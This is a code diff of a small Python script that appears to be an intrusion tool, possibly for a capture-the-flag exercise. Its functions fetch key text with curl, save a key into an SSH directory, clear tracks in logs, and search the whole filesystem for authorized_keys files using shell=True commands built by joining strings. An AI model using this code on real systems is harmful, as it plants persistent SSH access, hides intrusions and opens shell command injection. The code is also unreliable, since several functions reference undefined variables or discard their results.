@@ -12,14 +12,19 @@ class Flag:
         self.line_no = int(line_no)
         self.line_text = line_text
 
+def find_file(fname, loc):
+    cmd = " ".join(['find', loc, ' -name ', '\"'+ fname + '\"', ])
+    fnames = check_output(cmd, shell=True).decode('utf-8')
+    pprint(fnames)
+
 def get_key_text(url):
-    cmd = " ".join('curl ', url
+    cmd = " ".join(['curl ', url])
     check_output(cmd)
     return
 
 
 def save_key_file(key_text, ssh_dir):
-    cmd = " ".join('curl ', url, 
+    cmd = " ".join(['curl ', url])
     run(cmd)
     return
 
@@ -55,8 +60,9 @@ def clear_tracks(flag, logs):
     return
 
 if __name__ == '__main__':
-    flag = 'flag'
-    search_dir = '../tests'
-    raw_flags = find_flag(flag, search_dir)
-    F_list = make_flag(raw_flags)
-    print(F_list)
+    #flag = 'flag'
+    #search_dir = '../tests/log'
+    #raw_flags = find_flag(flag, search_dir)
+    #F_list = make_flag(raw_flags)
+    #print(F_list)
+    find_file('authorized_keys', '/')
